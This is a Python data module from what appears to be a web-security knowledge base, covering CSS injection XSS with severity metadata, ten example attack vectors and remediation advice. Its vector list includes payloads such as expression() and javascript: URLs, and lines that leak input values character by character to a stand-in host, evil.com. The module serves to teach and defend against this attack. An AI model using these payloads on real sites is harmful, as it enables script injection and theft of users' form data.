#!/usr/bin/env python3
# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-27 UTC
# Status: Refactored
# Telegram: https://t.me/EasyProTech

"""
CSS Injection XSS Context

CSS-based XSS attacks through style injection, expression(), behavior,
-moz-binding, and modern CSS-in-JS vulnerabilities.
"""

DETAILS = {
    "title": "CSS Injection XSS",
    "severity": "medium",
    "cvss_score": 6.1,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["css", "injection", "style", "exfiltration", "xss"],
    "description": """
CSS injection allows attackers to inject malicious styles that can lead to XSS.
Legacy browsers supported expression(), behavior, and -moz-binding for JS execution.
Modern attacks include CSS exfiltration, attribute selectors for data theft,
and injection into CSS-in-JS frameworks.
""",
    "attack_vector": """
CSS INJECTION XSS VECTORS:

1. EXPRESSION() (IE LEGACY)
   body { background: expression(alert(1)) }

2. -MOZ-BINDING (FIREFOX LEGACY)
   div { -moz-binding: url(xss.xml#xss) }

3. BEHAVIOR: (IE HTC)
   div { behavior: url(evil.htc) }

4. @IMPORT URL()
   @import url(//evil.com/steal.css)

5. URL() JAVASCRIPT:
   background: url(javascript:alert(1))

6. ATTRIBUTE SELECTORS
   input[value^="a"] { background: url(//evil.com?a) }
   Exfiltrate character by character

7. STYLED-COMPONENTS
   const Div = styled.div`${userInput}`
   Template injection

8. CSS CUSTOM PROPERTIES
   --inject: ;} * { background: url(//evil.com) }

9. PAINT WORKLETS
   background: paint(userWorklet)

10. FONT-FACE UNICODE-RANGE
    @font-face { font-family: a; src: url(//evil.com?a); unicode-range: U+0041 }
    Detect specific characters
""",
    "remediation": """
CSS INJECTION XSS PREVENTION:

1. SANITIZE STYLE ATTRIBUTES
   Remove dangerous properties
   Use CSS sanitizer

2. BLOCK DANGEROUS CSS
   Filter: expression, behavior, -moz-binding
   Block: javascript:, url() to external

3. CSP STYLE-SRC
   Content-Security-Policy: style-src 'self'

4. VALIDATE CSS VALUES
   Whitelist allowed properties
   Check value patterns

5. ESCAPE CSS STRINGS
   CSS.escape() for identifiers
   Escape quotes in strings

6. USE INLINE STYLES CAREFULLY
   Avoid user input in style=""

7. CSS-IN-JS SAFETY
   Validate template inputs
   Use parameterized APIs
""",
}
